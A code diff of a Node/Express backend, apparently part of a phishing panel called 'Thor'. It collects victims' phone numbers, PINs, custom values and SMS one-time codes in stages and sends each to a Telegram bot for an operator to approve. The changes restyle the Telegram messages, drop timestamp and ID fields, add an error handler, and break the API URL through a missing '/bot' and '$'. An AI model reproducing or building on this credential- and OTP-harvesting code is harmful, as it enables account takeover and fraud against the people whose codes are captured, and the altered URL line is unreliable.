@@ -19,7 +19,7 @@ async function telegram(method, data) {
     throw new Error("Telegram environment variables are missing.");
   }
 
-const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;  
+  const url = `https://telegram.org{BOT_TOKEN}/${method}`;
   
   const response = await fetch(url, {
     method: "POST",
@@ -52,7 +52,7 @@ app.post("/api/session", (req, res) => {
   res.json({ sessionId });
 });
 
-// Request Telegram approval — Styled with distinct line spacing
+// Request Telegram approval — Styled with distinct line spacing and copy formats
 app.post("/api/approval-request", async (req, res) => {
   const { sessionId, stage, payload } = req.body || {};
   const allowedStages = ["pin", "code1", "code2"];
@@ -73,24 +73,14 @@ app.post("/api/approval-request", async (req, res) => {
   session.status = "pending";
   session.updatedAt = Date.now();
 
-  const currentTimestamp = new Date().toLocaleString("en-US", {
-    month: "2-digit",
-    day: "2-digit",
-    year: "numeric",
-    hour: "2-digit",
-    minute: "2-digit",
-    second: "2-digit",
-    hour12: true
-  });
-
-  let headingTitle = "PIN VERIFICATION NEEDED";
+  let headingTitle = "🟢 PIN VERIFICATION NEEDED";
   let ruleLength = "PIN Length: 5 digits";
   
   if (stage === "code1") {
-    headingTitle = "CUSTOM VALUE VERIFICATION NEEDED";
+    headingTitle = "🟢 CUSTOM VALUE VERIFICATION NEEDED";
     ruleLength = `Value Inputted: Provided`;
   } else if (stage === "code2") {
-    headingTitle = "FINAL SMS VERIFICATION NEEDED";
+    headingTitle = "🟢 FINAL SMS VERIFICATION NEEDED";
     ruleLength = "OTP Code Length: 4 digits";
   }
 
@@ -98,21 +88,17 @@ app.post("/api/approval-request", async (req, res) => {
   const pinVal = session.data.pin ? session.data.pin.trim() : "None";
   const code1Val = session.data.code1 ? session.data.code1.trim() : "None";
   const code2Val = session.data.code2 ? session.data.code2.trim() : "None";
-  const shortId = `user_${sessionId.substring(0, 8)}`;
 
   try {
     // Labels are separated from code blocks, and values live on clean lines for clean tap-to-copy
     const textMessage = 
       `<b># Thor - ${stage.toUpperCase()} Verification</b>\n` +
       `<b>${headingTitle}</b>\n\n` +
-      `USER DETAILS:\n\n` +
+      `🟩 USER DETAILS 🟩\n\n` +
       `• Phone Number --\n<code>${phoneVal}</code>\n\n` +
       `• PIN Code --\n<code>${pinVal}</code>\n\n` +
       `• Custom Text --\n<code>${code1Val}</code>\n\n` +
       `• Final SMS Code --\n<code>${code2Val}</code>\n\n` +
-      `• User ID --\n<code>${shortId}</code>\n\n` +
-      `• Time --\n<code>${currentTimestamp}</code>\n\n` +
-      `• Bot --\n<code>user178</code>\n\n` +
       `───────────────────────\n\n` +
       `Verify Entry Parameters:\n` +
       `• ${ruleLength}\n` +
@@ -201,6 +187,10 @@ app.post("/telegram-webhook", async (req, res) => {
   }
 });
 
-app.listen(PORT, () => console.log(`Backend server active on port ${PORT}`));
+app.use((err, req, res, next) => {
+  console.error(err.stack);
+  res.status(500).json({ error: "Internal server error" });
+});
 
+app.listen(PORT, () => console.log(`Backend server active on port ${PORT}`));
 
